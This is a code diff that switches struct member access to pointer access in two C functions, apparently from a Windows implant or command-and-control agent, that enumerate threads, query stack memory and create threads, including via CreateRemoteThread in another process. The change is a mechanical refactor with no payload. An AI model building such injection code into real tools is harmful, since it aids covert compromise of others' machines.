@@ -32,7 +32,7 @@ BOOL ThreadQueryTib(
     DWORD                    ThreadId   = 0;
 
     /* our current thread id */
-    ThreadId            = U_PTR( Instance.Teb->ClientId.UniqueThread );
+    ThreadId            = U_PTR( Instance->Teb->ClientId.UniqueThread );
     ThdCtx.ContextFlags = CONTEXT_FULL;
 
     /* iterate over current process threads */
@@ -67,7 +67,7 @@ BOOL ThreadQueryTib(
 #if _WIN64
                         if ( NT_SUCCESS( SysNtQueryVirtualMemory( NtCurrentProcess(), C_PTR( ThdCtx.Rsp ), MemoryBasicInformation, &Memory1, sizeof( Memory1 ), NULL ) ) )
 #else
-                        if ( NT_SUCCESS( Instance.Win32.NtQueryVirtualMemory( NtCurrentProcess(), C_PTR( ThdCtx.Esp ), MemoryBasicInformation, &Memory1, sizeof( Memory1 ), NULL ) ) )
+                        if ( NT_SUCCESS( Instance->Win32.NtQueryVirtualMemory( NtCurrentProcess(), C_PTR( ThdCtx.Esp ), MemoryBasicInformation, &Memory1, sizeof( Memory1 ), NULL ) ) )
 #endif
                         {
                             /* query memory info about rsp address */
@@ -238,7 +238,7 @@ HANDLE ThreadCreate(
         }
 
         case THREAD_METHOD_CREATEREMOTETHREAD: {
-            Thread = Instance.Win32.CreateRemoteThread( Process, NULL, 0, Entry, Arg, 0, ThreadId );
+            Thread = Instance->Win32.CreateRemoteThread( Process, NULL, 0, Entry, Arg, 0, ThreadId );
             break;
         }
 
@@ -261,7 +261,7 @@ HANDLE ThreadCreate(
                 }
             } else {
                 PRINTF( "Failed to create new thread => NtStatus:[%x]\n", NtStatus );
-                NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
+                NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
             }
 
             break;
